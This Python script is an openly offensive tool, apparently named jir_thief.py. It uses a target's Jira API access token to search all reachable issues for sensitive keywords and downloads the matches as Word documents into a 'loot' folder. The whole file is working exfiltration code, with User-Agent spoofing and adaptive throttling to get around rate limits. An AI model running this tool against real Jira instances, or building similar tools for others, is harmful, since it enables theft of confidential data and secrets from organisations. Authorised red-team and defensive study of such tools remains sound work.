import requests, json, sys, getopt, time, os, threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Set that holds all of the issues found in the keyword search
issueSet = set()

# Set these ENV Variables to proxy through burp:
# export REQUESTS_CA_BUNDLE='/path/to/pem/encoded/cert'
# export HTTP_PROXY="http://127.0.0.1:8080"
# export HTTPS_PROXY="http://127.0.0.1:8080"


default_headers = {
    'Accept': 'application/json',
}

form_token_headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Atlassian-Token": "no-check",
}

# v3 search uses POST with JSON body - no more startAt offset pagination
search_headers = {
    'Accept': 'application/json',
    'Content-Type': 'application/json',
}


def searchKeyWords(path, username, access_token, cURL, search_workers=3):
    SEARCH_URL = cURL + '/rest/api/3/search/jql'

    try:
        with open(path, "r") as f:
            terms = [line.strip() for line in f
                     if line.strip() and not line.strip().startswith('#')]
    except Exception as e:
        print('[*] An error occurred opening the dictionary file: %s' % str(e))
        sys.exit(2)

    print("[*] Searching %d terms with %d thread(s)" % (len(terms), search_workers))

    lock = threading.Lock()

    def fetch_term(term):
        """Fetch all pages for a single keyword and return its issue keys."""
        local_keys = set()
        nextPageToken = None
        page = 1
        rate_limit_waits = 0

        while rate_limit_waits < 10:
            payload = {
                'jql': 'text~"%s"' % term,
                'maxResults': 100,
                'fields': ['key'],
            }
            if nextPageToken:
                payload['nextPageToken'] = nextPageToken

            response = requests.request(
                "POST",
                SEARCH_URL,
                auth=(username, access_token),
                headers=search_headers,
                data=json.dumps(payload)
            )

            if response.status_code == 429:
                try:
                    retry_after = int(response.headers.get('Retry-After', 15))
                except (ValueError, TypeError):
                    retry_after = 15
                print("[!] Rate limited searching '%s' — waiting %ds" % (term, retry_after))
                time.sleep(retry_after)
                rate_limit_waits += 1
                continue

            if response.status_code != 200:
                print("[!] API error (HTTP %d) for term '%s': %s" % (
                    response.status_code, term, response.text[:200]))
                break

            if not response.text.strip():
                print("[!] Empty response body for term '%s' (page %d) — skipping page" % (term, page))
                break

            try:
                jsonResp = response.json()
            except Exception as e:
                print("[!] Failed to parse response for term '%s' (page %d): %s" % (term, page, str(e)))
                break

            issues = jsonResp.get('issues', [])

            if not issues:
                break

            for issue in issues:
                local_keys.add(issue['key'])

            print("[*] [%s] page %d: %d issues" % (term, page, len(issues)))
            page += 1

            nextPageToken = jsonResp.get('nextPageToken')
            if not nextPageToken:
                break

        return term, local_keys

    completed = 0
    with ThreadPoolExecutor(max_workers=search_workers) as executor:
        futures = {executor.submit(fetch_term, term): term for term in terms}

        for future in as_completed(futures):
            try:
                term, keys = future.result()
            except Exception as e:
                term = futures[future]
                keys = set()
                print("[!] Search failed for term '%s': %s" % (term, str(e)))
            completed += 1
            with lock:
                before = len(issueSet)
                issueSet.update(keys)
                added = len(issueSet) - before

            if added:
                print("[*] (%d/%d) %d unique issues added for term: %s" % (
                    completed, len(terms), added, term))
            else:
                print("[*] (%d/%d) No new issues for term: %s" % (completed, len(terms), term))

    print("[*] Compiled set of %d unique issues to download" % len(issueSet))


def downloadContent(username, access_token, cURL, initial_workers=5, min_workers=1, max_retries=3):
    headers = form_token_headers
    print('[*] Downloading files')

    # Resume: skip files already present in loot/
    pending = [key for key in issueSet if not os.path.exists("loot/{}.doc".format(key))]
    skipped = len(issueSet) - len(pending)
    if skipped:
        print('[*] Skipping %d already-downloaded file(s)' % skipped)

    total = len(pending)
    if total == 0:
        print('[*] Nothing to download.')
        return

    # Semaphore controls actual concurrency independently of the thread pool size.
    # Stealing a slot (acquire without release) reduces live threads; returning one
    # (extra release) restores them — no need to rebuild the executor.
    lock = threading.Lock()
    sem = threading.Semaphore(initial_workers)
    state = {
        'completed': 0,
        'failed': [],
        'workers': initial_workers,
        'last_rate_limit': 0.0,
    }

    start_time = time.time()
    last_report = [start_time]
    report_interval = 30

    print('[*] Starting download with %d thread(s)' % initial_workers)

    def dial_back():
        """Steal one semaphore slot to reduce concurrency by 1."""
        with lock:
            if state['workers'] <= min_workers:
                state['last_rate_limit'] = time.time()
                return
            # Non-blocking: only steal if a free slot exists right now.
            # If all slots are busy we still record the rate-limit timestamp
            # so recovery is delayed, and the next free slot will be stolen
            # on the following 429.
            if sem.acquire(blocking=False):
                state['workers'] -= 1
                state['last_rate_limit'] = time.time()
                print('\n[!] Rate limiting detected — reducing to %d thread(s)' % state['workers'])
            else:
                state['last_rate_limit'] = time.time()

    def try_recover():
        """Return one stolen slot after 60 s of no rate limiting."""
        with lock:
            if state['workers'] >= initial_workers:
                return
            if time.time() - state['last_rate_limit'] < 60:
                return
            state['workers'] += 1
            sem.release()
            print('\n[*] No rate limiting for 60s — increasing to %d thread(s)' % state['workers'])

    def download_one(issueKey):
        url = cURL + "/si/jira.issueviews:issue-word/{KEY}/{KEY}.doc".format(KEY=issueKey)
        path = "loot/{}.doc".format(issueKey)
        success = False

        sem.acquire()
        try:
            error_attempts = 0
            rate_limit_waits = 0

            while error_attempts < max_retries and rate_limit_waits < 10:
                try:
                    response = requests.request("GET", url,
                        auth=(username, access_token),
                        headers=headers)

                    if response.status_code == 429:
                        try:
                            retry_after = int(response.headers.get('Retry-After', 15))
                        except (ValueError, TypeError):
                            retry_after = 15
                        dial_back()
                        print('[!] Rate limited on %s — waiting %ds' % (issueKey, retry_after))
                        time.sleep(retry_after)
                        rate_limit_waits += 1
                        continue  # retry without counting against error_attempts

                    if response.status_code != 200:
                        raise Exception("HTTP %d: %s" % (response.status_code, response.text[:200]))

                    with open(path, 'wb') as f:
                        f.write(response.content)
                    success = True
                    break

                except Exception as err:
                    error_attempts += 1
                    if error_attempts < max_retries:
                        wait = 2 ** error_attempts
                        print('[!] Attempt %d/%d failed for %s: %s. Retrying in %ds...' % (
                            error_attempts, max_retries, issueKey, str(err), wait))
                        time.sleep(wait)
                    else:
                        print('[!] All %d attempts failed for %s: %s' % (max_retries, issueKey, str(err)))
        finally:
            sem.release()

        return issueKey, success

    with ThreadPoolExecutor(max_workers=initial_workers) as executor:
        futures = {executor.submit(download_one, key): key for key in pending}

        for future in as_completed(futures):
            try:
                issueKey, success = future.result()
            except Exception as err:
                issueKey = futures[future]
                success = False
                print('[!] Unexpected error for %s: %s' % (issueKey, str(err)))

            with lock:
                state['completed'] += 1
                if not success:
                    state['failed'].append(issueKey)

            try_recover()

            now = time.time()
            if now - last_report[0] >= report_interval or state['completed'] == total:
                elapsed = now - start_time
                avg = elapsed / state['completed']
                remaining = avg * (total - state['completed'])
                pct = (state['completed'] / total) * 100
                print('[*] Progress: %d/%d (%.1f%%) | Threads: %d | Elapsed: %s | ETA: %s | Failed: %d' % (
                    state['completed'], total, pct, state['workers'],
                    time.strftime('%H:%M:%S', time.gmtime(elapsed)),
                    time.strftime('%H:%M:%S', time.gmtime(remaining)),
                    len(state['failed'])))
                last_report[0] = now

    succeeded = total - len(state['failed'])
    print('\n[*] Download complete: %d succeeded, %d failed' % (succeeded, len(state['failed'])))
    if state['failed']:
        print('[!] The following issues could not be downloaded:')
        for key in state['failed']:
            print('    - %s' % key)


def main():
    cURL=""
    dict_path = ""
    username = ""
    access_token = ""
    user_agent = ""
    threads = 5
    search_threads = 3

    # usage
    usage = '\nusage: python3 jir_thief.py [-h] -j <TARGET URL> -u <Target Username> -p <API ACCESS TOKEN> -d <DICTIONARY FILE PATH> [-a "<UA STRING>"] [-t <THREADS>] [-s <SEARCH THREADS>]'

    #help
    help = '\nThis Module will connect to Jira\'s API using an access token, '
    help += 'export to a word .doc, and download the Jira issues\nthat the target has access to. '
    help += 'It allows you to use a dictionary/keyword search file to search all files in the target\nJira for'
    help += ' potentially sensitive data. It will output exfiltrated DOCs to the ./loot directory'
    help += '\n\narguments:'
    help += '\n\t-j <TARGET JIRA URL>, --url <TARGET JIRA URL>'
    help += '\n\t\tThe URL of target Jira account'
    help += '\n\t-u <TARGET JIRA ACCOUNT USERNAME>, --user <TARGET USERNAME>'
    help += '\n\t\tThe username of target Jira account'
    help += '\n\t-p <TARGET JIRA ACCOUNT API ACCESS TOKEN>, --accesstoken <TARGET JIRA ACCOUNT API ACCESS TOKEN>'
    help += '\n\t\tThe API Access Token of target Jira account'
    help += '\n\t-d <DICTIONARY FILE PATH>, --dict <DICTIONARY FILE PATH>'
    help += '\n\t\tPath to the dictionary file.'
    help += '\n\t\tYou can use the provided dictionary, per example: "-d ./dictionaries/secrets-keywords.txt"'
    help += '\n\noptional arguments:'
    help += '\n\t-a "<DESIRED UA STRING>", --user-agent "<DESIRED UA STRING>"'
    help += '\n\t\tThe User-Agent string you wish to send in the http request.'
    help += '\n\t\tYou can use the latest chrome for MacOS for example: -a "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"'
    help += '\n\t\tDefault is "python-requests/2.25.1"'
    help += '\n\t-t <THREADS>, --threads <THREADS>'
    help += '\n\t\tNumber of concurrent download threads (default: 5).'
    help += '\n\t\tAutomatically reduced when rate limiting is detected, and restored after 60s of quiet.'
    help += '\n\t-s <SEARCH THREADS>, --search-threads <SEARCH THREADS>'
    help += '\n\t\tNumber of concurrent keyword search threads (default: 3).'
    help += '\n\t\tEach thread searches one keyword independently across all pages.'
    help += '\n\n\t-h, --help\n\t\tshow this help message and exit\n'

    # try parsing options and arguments
    try :
        opts, args = getopt.getopt(sys.argv[1:], "hj:u:p:d:a:t:s:", ["help", "url=", "user=", "accesstoken=", "dict=", "user-agent=", "threads=", "search-threads="])
    except getopt.GetoptError as err:
        print(str(err))
        print(usage)
        sys.exit(2)
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print(help)
            sys.exit()
        if opt in ("-j", "--url"):
            cURL = arg
        if opt in ("-u", "--user"):
            username = arg
        if opt in ("-p", "--accesstoken"):
            access_token = arg
        if opt in ("-d", "--dict"):
            dict_path = arg
        if opt in ("-a", "--user-agent"):
            user_agent = arg
        if opt in ("-t", "--threads"):
            try:
                threads = int(arg)
                if threads < 1:
                    raise ValueError
            except ValueError:
                print("\nThreads (-t) must be a positive integer\n")
                sys.exit(2)
        if opt in ("-s", "--search-threads"):
            try:
                search_threads = int(arg)
                if search_threads < 1:
                    raise ValueError
            except ValueError:
                print("\nSearch threads (-s) must be a positive integer\n")
                sys.exit(2)

    # check for mandatory arguments
    if not username:
        print("\nUsername  (-u, --user) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    if not access_token:
        print("\nAccess Token  (-p, --accesstoken) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    if not dict_path:
        print("\nDictionary Path  (-d, --dict) is a mandatory argument\n")
        print(usage)
        sys.exit(2)
    if not cURL:
        print("\nJira URL  (-j, --url) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    # Strip trailing / from URL if it has one
    if cURL.endswith('/'):
        cURL = cURL[:-1]

    # Check for user-agent argument
    if user_agent:
        default_headers['User-Agent'] = user_agent
        form_token_headers['User-Agent'] = user_agent
        search_headers['User-Agent'] = user_agent

    searchKeyWords(dict_path, username, access_token, cURL, search_workers=search_threads)
    downloadContent(username, access_token, cURL, initial_workers=threads)


if __name__ == "__main__":
    main()
